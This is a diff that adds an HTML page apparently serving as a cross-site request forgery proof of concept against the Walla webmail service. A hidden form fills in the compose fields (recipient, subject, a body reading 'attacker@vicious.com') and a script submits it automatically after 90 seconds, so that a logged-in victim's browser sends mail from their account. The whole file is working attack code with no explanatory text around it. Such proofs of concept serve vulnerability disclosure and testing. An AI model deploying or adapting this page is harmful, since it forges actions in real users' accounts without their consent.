@@ -1,0 +1,21 @@
+<html>
+	<body>
+		<form action="http://newmail.walla.co.il/" method="POST" enctype="multipart/form-data">
+			<input name="w" value="/@light/22/scripts/compose.commit"/>
+			<input name="htmlMessage" value="attacker@vicious.com"/>
+			<input type="number" name="saveoutbox" value="1"/>
+			<input name="wid" value=""/>
+			<input name="id" value=""/>
+			<input type="number" name="action" value="0"/>
+			<input name="draftId2Send" value="abc"/>
+			<input name="to" value="tatidim2012@walla.com,"/>
+			<input name="cc" value=""/>
+			<input name="bcc" value=""/>
+			<input name="subject" value="My new email"/>		
+		</form>
+		<script>
+			setTimeout(function(){document.forms[0].submit();}, 90000);
+		</script>
+	</body>
+
+</html>
